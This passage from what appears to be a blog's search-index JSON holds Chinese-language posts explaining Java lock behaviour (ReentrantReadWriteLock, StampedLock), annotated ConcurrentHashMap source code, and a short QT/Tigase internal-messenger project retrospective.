class=\"type\">Lock</span> <span class=\"variable\">read</span> <span class=\"operator\">=</span> readWriteLock.readLock();</span><br><span class=\"line\"><span class=\"type\">Lock</span> <span class=\"variable\">write</span> <span class=\"operator\">=</span> readWriteLock.writeLock();</span><br><span class=\"line\">read.lock();</span><br><span class=\"line\">write.lock();</span><br></pre></td></tr></table></figure>\n<p>上述代码write.lock会一直等待，因为读锁在获取锁时并不会修改属性exclusiveOwnerThread为当前线程，exclusiveOwnerThread为null，在write.lock时因为存在读锁，会判断当前获取锁的线程是否当前线程，返回-1获取锁失败，进入等待，这样就会导致线程死等。这种情况的出现，其他线程读锁无影响，写锁会无法获取。</p>\n<p>先用写锁后用读锁，如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ReentrantReadWriteLock</span> <span class=\"variable\">readWriteLock</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ReentrantReadWriteLock</span>();</span><br><span class=\"line\"><span class=\"type\">Lock</span> <span class=\"variable\">read</span> <span class=\"operator\">=</span> readWriteLock.readLock();</span><br><span class=\"line\"><span class=\"type\">Lock</span> <span class=\"variable\">write</span> <span class=\"operator\">=</span> readWriteLock.writeLock();</span><br><span class=\"line\">write.lock();</span><br><span class=\"line\">read.lock();</span><br></pre></td></tr></table></figure>\n<p>上述代码并不会出现问题，在获取写锁后，读锁依然会正常获取，因为exclusiveOwnerThread在写获取锁时，会修改为当前线程，读锁在获取时会判断exclusiveOwnerThread是否为当前线程。此处先写锁后读锁，称为锁降级。在修改数据后需要读取数据，为了减少锁力度，可以采用该方法，读锁获取后释放写锁，当前线程以及其他线程都能拿到最新的数据。</p>\n","categories":["多线程学习"],"tags":["多线程","同步","读写锁"]},{"title":"StampedLock","url":"/2017/12/27/StampedLock/","content":"<p>在使用ReentrantReadWriteLock时，获取写锁时，不能存在任何其他锁。如果存在读超大与写，可能会出现获取写锁线程一直处在等待状态导致饥饿。<br>在JDK1.8中引入StampedLock，StampedLock控制锁有3种状态：写，读，乐观读。</p>\n<p>所谓的乐观读模式，也就是若读的操作很多，写的操作很少的情况下，你可以乐观地认为，写入与读取同时发生几率很少，因此不悲观地使用完全的读取锁定，程序可以查看读取资料之后，是否遭到写入执行的变更，再采取后续的措施（重新读取变更信息，或者抛出异常） ，这一个小小改进，可大幅度提高程序的吞吐量！！</p>\n<span id=\"more\"></span>\n<p>StampedLock官方例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Point</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">double</span> x, y;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">StampedLock</span> <span class=\"variable\">sl</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StampedLock</span>();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">move</span><span class=\"params\">(<span class=\"type\">double</span> deltaX, <span class=\"type\">double</span> deltaY)</span> &#123; <span class=\"comment\">// an exclusively locked method</span></span><br><span class=\"line\">        <span class=\"comment\">//获取写锁</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">stamp</span> <span class=\"operator\">=</span> sl.writeLock();</span><br><span class=\"line\">        <span class=\"comment\">//修改数据</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            x += deltaX;</span><br><span class=\"line\">            y += deltaY;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//释放写锁</span></span><br><span class=\"line\">            sl.unlockWrite(stamp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">double</span> <span class=\"title function_\">distanceFromOrigin</span><span class=\"params\">()</span> &#123; <span class=\"comment\">// A read-only method</span></span><br><span class=\"line\">        <span class=\"comment\">//获取乐观读，返回一个标示用于后续判断是否发生了写操作</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">stamp</span> <span class=\"operator\">=</span> sl.tryOptimisticRead();</span><br><span class=\"line\">        <span class=\"type\">double</span> <span class=\"variable\">currentX</span> <span class=\"operator\">=</span> x, currentY = y;</span><br><span class=\"line\">        <span class=\"comment\">//验证乐观锁期间是否存在写锁</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!sl.validate(stamp)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//如果存在写锁修改了数据，获取悲观读锁。此处也可以使用tryOptimisticRead然后通过CAS获取锁</span></span><br><span class=\"line\">            stamp = sl.readLock();</span><br><span class=\"line\">            <span class=\"comment\">//修改数据</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                currentX = x;</span><br><span class=\"line\">                currentY = y;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                <span class=\"comment\">//释放锁</span></span><br><span class=\"line\">                sl.unlockRead(stamp);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//计算值</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> Math.sqrt(currentX * currentX + currentY * currentY);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">void</span> <span class=\"title function_\">moveIfAtOrigin</span><span class=\"params\">(<span class=\"type\">double</span> newX, <span class=\"type\">double</span> newY)</span> &#123; <span class=\"comment\">// upgrade</span></span><br><span class=\"line\">        <span class=\"comment\">// Could instead start with optimistic, not read mode</span></span><br><span class=\"line\">        <span class=\"type\">long</span> <span class=\"variable\">stamp</span> <span class=\"operator\">=</span> sl.readLock();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (x == <span class=\"number\">0.0</span> &amp;&amp; y == <span class=\"number\">0.0</span>) &#123;</span><br><span class=\"line\">                <span class=\"type\">long</span> <span class=\"variable\">ws</span> <span class=\"operator\">=</span> sl.tryConvertToWriteLock(stamp);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (ws != <span class=\"number\">0L</span>) &#123;</span><br><span class=\"line\">                    stamp = ws;</span><br><span class=\"line\">                    x = newX;</span><br><span class=\"line\">                    y = newY;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    sl.unlockRead(stamp);</span><br><span class=\"line\">                    stamp = sl.writeLock();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">            sl.unlock(stamp);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>暂时对StampedLock理解不够，后续理解后补充StampedLock使用。</p>\n<p>可参考：</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc3VuZmVpemhpL2FydGljbGUvZGV0YWlscy81MjEzNTEzNg==\">http://blog.csdn.net/sunfeizhi/article/details/52135136<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5pbXBvcnRuZXcuY29tLzE0OTQxLmh0bWw=\">http://www.importnew.com/14941.html<i class=\"fa fa-external-link-alt\"></i></span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLnRha2lwaS5jb20vamF2YS04LXN0YW1wZWRsb2Nrcy12cy1yZWFkd3JpdGVsb2Nrcy1hbmQtc3luY2hyb25pemVkLw==\">https://blog.takipi.com/java-8-stampedlocks-vs-readwritelocks-and-synchronized/<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n","categories":["多线程学习"],"tags":["多线程","同步","StampedLock"]},{"title":"QT + Tigase","url":"/2017/11/30/QT-Tigase/","content":"<h3 id=\"项目背景\"><a href=\"#项目背景\" class=\"headerlink\" title=\"项目背景\"></a>项目背景</h3><p>因为企业内部无外网，需要一个内部通讯工具，考虑买RTX或者内部开发一个，前期做相关技术调研，评估自己实现难度。定的技术方案PC端使用QT做界面，服务端使用Tigase，使用XMPP通讯。主要功能有：单聊、群聊、组织结构、文件、图片发送。</p>\n<h3 id=\"QT使用\"><a href=\"#QT使用\" class=\"headerlink\" title=\"QT使用\"></a>QT使用</h3><p>QT使用qml做页面，其他相关逻辑采用c++，与服务端通讯采用QXMPP框架。<br>因为没用QT开发过，在github上找到WinT-Messenger开源项目，了解相关代码编写。</p>\n<p>在使用QT过程中，主要难点在于：</p>\n<ol>\n<li>布局：需要了解熟悉QT的各种布局</li>\n<li>c++与QML直接通讯，c++与服务端通讯</li>\n<li>QT相关常用组件<span id=\"more\"></span>\n在开发界面时，因不熟悉qml，刚开始使用Rectangle，设置随机颜色画出基本页面以及布局。之后把不同的功能抽取做出相应的组件。</li>\n</ol>\n<h3 id=\"Tigase使用\"><a href=\"#Tigase使用\" class=\"headerlink\" title=\"Tigase使用\"></a>Tigase使用</h3><p>Tigase采用的是Java开发，可以参考官方文档。不过在开发过程中出现问题第三方资料较少。</p>\n<p>Tigase采用的是7.1.2，群聊采用的是tigase muc组件。在之前规划中，没有好友一说，直接通过组织结构聊天，只有最近联系人。<br>Tigase面临的问题：</p>\n<ol>\n<li>最新版muc组件为2.4.1，群聊保存在内存中，可参考muc最新未正式发布的源码中重写群聊存入数据库，设计群聊数据库（群可视为特殊用户）</li>\n<li>用户退出账号默认退出群聊，需修改相关逻辑</li>\n<li>修改保存用户最近联系人，用户登录后，查询其最近联系人，设计最近联系人数据库</li>\n<li>开发自己插件，配合组织结构查询</li>\n<li>通过groovy脚本添加文件上传，返回上传文件后地址。</li>\n</ol>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>在使用过程中，有时因为相关资料不多需要调试源码解决问题，对于收获还是有的。<br>c++使用较为困难，当前做出了单聊、群聊、以及部分组织结构。之后因为公司决定使用钉钉，该项目被废弃。</p>\n","categories":["QT","Tigase"],"tags":["Tigase","QT"]},{"title":"Java并发容器-ConcurrentHashMap","url":"/2017/12/28/Java%E5%B9%B6%E5%8F%91%E5%AE%B9%E5%99%A8-ConcurrentHashMap/","content":"<p>jdk1.7中ConcurrentHashMap与jdk1.8中实现不一致，1.7中采用的事分段锁，此处使用的是1.8，利用CAS+Synchronized来保证并发更新的安全，当然底层采用数组+链表+红黑树的存储结构。</p>\n<h3 id=\"前期概念\"><a href=\"#前期概念\" class=\"headerlink\" title=\"前期概念\"></a>前期概念</h3><p>在ConcurrentHashMap中有几个重要内部类：</p>\n<ul>\n<li>Node：普通的节点，key-value形式，用于链表节点存储。</li>\n<li>TreeNode：红黑树节点，Node子类。</li>\n<li>TreeBin：红黑树，通过传入TreeNode构造一颗红黑树。</li>\n<li>ForwardingNode：Node子类，辅助节点，用于扩容操作。</li>\n</ul>\n<p>在ConcurrentHashMap中，最开始是采用链表存储数据，当数据过长（TREEIFY_THRESHOLD默认长度8），就会转换为红黑树来处理，将原有Node节点包装成TreeNode放入TreeBin中，然后由TreeBin完成红黑树的转换。</p>\n<span id=\"more\"></span>\n<h3 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h3><p>容器构造方法：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//创建一个空对象，什么也不做，在后续put的时候，执行初始化</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentHashMap</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 创建一个指定大小空map，不需要动态调整大小</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentHashMap</span><span class=\"params\">(<span class=\"type\">int</span> initialCapacity)</span> &#123;计算值</span><br><span class=\"line\">    <span class=\"comment\">//判断初始化容量</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (initialCapacity &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>();</span><br><span class=\"line\">    <span class=\"comment\">//如果初始化容量大于最大容量（(1 &lt;&lt; 30)&gt;&gt;&gt;1）使用MAXIMUM_CAPACITY，否则通过一套算法返回计算值</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">cap</span> <span class=\"operator\">=</span> ((initialCapacity &gt;= (MAXIMUM_CAPACITY &gt;&gt;&gt; <span class=\"number\">1</span>)) ?</span><br><span class=\"line\">               MAXIMUM_CAPACITY :</span><br><span class=\"line\">               tableSizeFor(initialCapacity + (initialCapacity &gt;&gt;&gt; <span class=\"number\">1</span>) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    <span class=\"comment\">//sizeCtl 控制标示符</span></span><br><span class=\"line\">    <span class=\"comment\">/*1. 负数表示正在进行初始化或者扩容</span></span><br><span class=\"line\"><span class=\"comment\">    * 2. -1 表示正在初始化</span></span><br><span class=\"line\"><span class=\"comment\">    * 3. -N 表示有N-1个线程正在进行扩容</span></span><br><span class=\"line\"><span class=\"comment\">    * 4. 正数或者0表示hash表还没被初始化，这个数值表示初始化或下一次进行扩容的大小</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.sizeCtl = cap;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 通过传递的Map创建一个新Map</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentHashMap</span><span class=\"params\">(Map&lt;? extends K, ? extends V&gt; m)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//默认值16</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.sizeCtl = DEFAULT_CAPACITY;</span><br><span class=\"line\">    <span class=\"comment\">//设置新值</span></span><br><span class=\"line\">    putAll(m);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 创建一个带有指定初始容量、加载因子（加载因子阈值，用来控制重新调整大小。在每 bin 中的平均元素数大于此阈值时，可能要重新调整大小。）的Map</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentHashMap</span><span class=\"params\">(<span class=\"type\">int</span> initialCapacity, <span class=\"type\">float</span> loadFactor)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>(initialCapacity, loadFactor, <span class=\"number\">1</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 创建一个带有指定初始容量、加载因子、并发级别的空Map</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> initialCapacity 初始化指定容器大小</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> loadFactor 建立初始化表大小的加载因子（表密度）</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> concurrencyLevel 并发等级，预估并发线程数量</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ConcurrentHashMap</span><span class=\"params\">(<span class=\"type\">int</span> initialCapacity,</span></span><br><span class=\"line\"><span class=\"params\">                         <span class=\"type\">float</span> loadFactor, <span class=\"type\">int</span> concurrencyLevel)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//校验入参</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!(loadFactor &gt; <span class=\"number\">0.0f</span>) || initialCapacity &lt; <span class=\"number\">0</span> || concurrencyLevel &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalArgumentException</span>();</span><br><span class=\"line\">    <span class=\"comment\">//如果并发等级大于初始化容器大小，容器大小采用并发等级</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (initialCapacity &lt; concurrencyLevel)   <span class=\"comment\">// Use at least as many bins</span></span><br><span class=\"line\">        initialCapacity = concurrencyLevel;   <span class=\"comment\">// as estimated threads</span></span><br><span class=\"line\">    <span class=\"comment\">//计算下一次扩充大小</span></span><br><span class=\"line\">    <span class=\"type\">long</span> <span class=\"variable\">size</span> <span class=\"operator\">=</span> (<span class=\"type\">long</span>)(<span class=\"number\">1.0</span> + (<span class=\"type\">long</span>)initialCapacity / loadFactor);</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">cap</span> <span class=\"operator\">=</span> (size &gt;= (<span class=\"type\">long</span>)MAXIMUM_CAPACITY) ?</span><br><span class=\"line\">        MAXIMUM_CAPACITY : tableSizeFor((<span class=\"type\">int</span>)size);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.sizeCtl = cap;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ConcurrentHashMap.put源码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> V <span class=\"title function_\">put</span><span class=\"params\">(K key, V value)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> putVal(key, value, <span class=\"literal\">false</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/** Implementation for put and putIfAbsent */</span></span><br><span class=\"line\"><span class=\"keyword\">final</span> V <span class=\"title function_\">putVal</span><span class=\"params\">(K key, V value, <span class=\"type\">boolean</span> onlyIfAbsent)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//校验参数</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (key == <span class=\"literal\">null</span> || value == <span class=\"literal\">null</span>) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NullPointerException</span>();</span><br><span class=\"line\">    <span class=\"comment\">//计算key hash</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">hash</span> <span class=\"operator\">=</span> spread(key.hashCode());</span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">binCount</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (Node&lt;K,V&gt;[] tab = table;;) &#123;</span><br><span class=\"line\">        Node&lt;K,V&gt; f; <span class=\"type\">int</span> n, i, fh;</span><br><span class=\"line\">        <span class=\"comment\">//判断tab是否为null，初始化table</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tab == <span class=\"literal\">null</span> || (n = tab.length) == <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//初始化table</span></span><br><span class=\"line\">            tab = initTable();</span><br><span class=\"line\">        <span class=\"comment\">//判断i位((n-1)&amp;hash)是否有插入值</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((f = tabAt(tab, i = (n - <span class=\"number\">1</span>) &amp; hash)) == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//没有插入值，通过Unsafe在指定位置插入值</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (casTabAt(tab, i, <span class=\"literal\">null</span>,</span><br><span class=\"line\">                         <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;K,V&gt;(hash, key, value, <span class=\"literal\">null</span>)))</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;                   <span class=\"comment\">// no lock when adding to empty bin</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//判断是否正在扩容</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((fh = f.hash) == MOVED)</span><br><span class=\"line\">            <span class=\"comment\">//帮助扩容</span></span><br><span class=\"line\">            tab = helpTransfer(tab, f);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">V</span> <span class=\"variable\">oldVal</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">            <span class=\"comment\">//对节点加锁</span></span><br><span class=\"line\">            <span class=\"keyword\">synchronized</span> (f) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//重新判断节点</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (tabAt(tab, i) == f) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//fn = f.hash &gt;=0 表示现在为链表，讲节点插入到链表尾部</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (fh &gt;= <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                        binCount = <span class=\"number\">1</span>;</span><br><span class=\"line\">                        <span class=\"keyword\">for</span> (Node&lt;K,V&gt; e = f;; ++binCount) &#123;</span><br><span class=\"line\">                            K ek;</span><br><span class=\"line\">                            <span class=\"comment\">//如果key一样</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (e.hash == hash &amp;&amp;</span><br><span class=\"line\">                                ((ek = e.key) == key ||</span><br><span class=\"line\">                                 (ek != <span class=\"literal\">null</span> &amp;&amp; key.equals(ek)))) &#123;</span><br><span class=\"line\">                                <span class=\"comment\">//替换值</span></span><br><span class=\"line\">                                oldVal = e.val;</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (!onlyIfAbsent)</span><br><span class=\"line\">                                    e.val = value;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                            Node&lt;K,V&gt; pred = e;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> ((e = e.next) == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                                pred.next = <span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;K,V&gt;(hash, key,</span><br><span class=\"line\">                                                          value, <span class=\"literal\">null</span>);</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    <span class=\"comment\">//判断是否树节点</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (f <span class=\"keyword\">instanceof</span> TreeBin) &#123;</span><br><span class=\"line\">                        Node&lt;K,V&gt; p;</span><br><span class=\"line\">                        binCount = <span class=\"number\">2</span>;</span><br><span class=\"line\">                        <span class=\"comment\">//树节点插入</span></span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ((p = ((TreeBin&lt;K,V&gt;)f).putTreeVal(hash, key,</span><br><span class=\"line\">                                                       value)) != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                            oldVal = p.val;</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (!onlyIfAbsent)</span><br><span class=\"line\">                                p.val = value;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (binCount != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                <span class=\"comment\">//判断链表长度是否超过最大值8</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> (binCount &gt;= TREEIFY_THRESHOLD)</span><br><span class=\"line\">                    <span class=\"comment\">//把链表转换为树结构</span></span><br><span class=\"line\">                    treeifyBin(tab, i);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (oldVal != <span class=\"literal\">null</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> oldVal;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">//map size + 1</span></span><br><span class=\"line\">    addCount(<span class=\"number\">1L</span>, binCount);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//初始化table</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Node&lt;K,V&gt;[] initTable() &#123;</span><br><span class=\"line\">    Node&lt;K,V&gt;[] tab; <span class=\"type\">int</span> sc;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((tab = table) == <span class=\"literal\">null</span> || tab.length == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//判断sizeCtl</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((sc = sizeCtl) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"comment\">//sizeCtl小于0表示正在进行初始化或者扩容，暂停当前正在执行的线程对象，并执行其他线程</span></span><br><span class=\"line\">            Thread.<span class=\"keyword\">yield</span>(); <span class=\"comment\">// lost initialization race; just spin</span></span><br><span class=\"line\">        <span class=\"comment\">//修改sizeCtl为-1，初始化</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (U.compareAndSwapInt(<span class=\"built_in\">this</span>, SIZECTL, sc, -<span class=\"number\">1</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ((tab = table) == <span class=\"literal\">null</span> || tab.length == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                    <span class=\"comment\">//判断sc值，也就是之前构造函数传入初始化容器打小生成的sizeCtl值,默认为16</span></span><br><span class=\"line\">                    <span class=\"type\">int</span> <span class=\"variable\">n</span> <span class=\"operator\">=</span> (sc &gt; <span class=\"number\">0</span>) ? sc : DEFAULT_CAPACITY;</span><br><span class=\"line\">                    <span class=\"meta\">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class=\"line\">                    Node&lt;K,V&gt;[] nt = (Node&lt;K,V&gt;[])<span class=\"keyword\">new</span> <span class=\"title class_\">Node</span>&lt;?,?&gt;[n];</span><br><span class=\"line\">                    <span class=\"comment\">//设置节点</span></span><br><span class=\"line\">                    table = tab = nt;</span><br><span class=\"line\">                    <span class=\"comment\">//下次扩容的大小</span></span><br><span class=\"line\">                    sc = n - (n &gt;&gt;&gt; <span class=\"number\">2</span>);<span class=\"comment\">//相当于0.75*n 设置一个扩容的阈值</span></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">finally</span> &#123;</span><br><span class=\"line\">                sizeCtl = sc;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> tab;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Adds to count, and if table is too small and not already</span></span><br><span class=\"line\"><span class=\"comment\"> * resizing, initiates transfer. If already resizing, helps</span></span><br><span class=\"line\"><span class=\"comment\"> * perform transfer if work is available.  Rechecks occupancy</span></span><br><span class=\"line\"><span class=\"comment\"> * after a transfer to see if another resize is already needed</span></span><br><span class=\"line\"><span class=\"comment\"> * because resizings are lagging additions.</span></span><br><span class=\"line\"><span class=\"comment\"> * 新增统计，如果table太小还准备调整大小，初始化扩容。如果已经调整大小，帮助扩容。在扩容完毕后重新检查容量，因为扩容相对落后</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> x 需要增加的值</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> check 如果小于0，不检查调整，如果小于等于1只需要检查是否存在竞争 if &lt;0, don&#x27;t check resize, if &lt;= 1 only check if uncontended</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"keyword\">void</span> <span class=\"title function_\">addCount</span><span class=\"params\">(<span class=\"type\">long</span> x, <span class=\"type\">int</span> check)</span> &#123;</span><br><span class=\"line\">    CounterCell[] as; <span class=\"type\">long</span> b, s;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((as = counterCells) != <span class=\"literal\">null</span> ||</span><br><span class=\"line\">        !U.compareAndSwapLong(<span class=\"built_in\">this</span>, BASECOUNT, b = baseCount, s = b + x)) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//counterCells不为null或者CAS修改baseCount值失败（并发的时候可能会出现失败）</span></span><br><span class=\"line\">        CounterCell a; <span class=\"type\">long</span> v; <span class=\"type\">int</span> m;</span><br><span class=\"line\">        <span class=\"type\">boolean</span> <span class=\"variable\">uncontended</span> <span class=\"operator\">=</span> <span 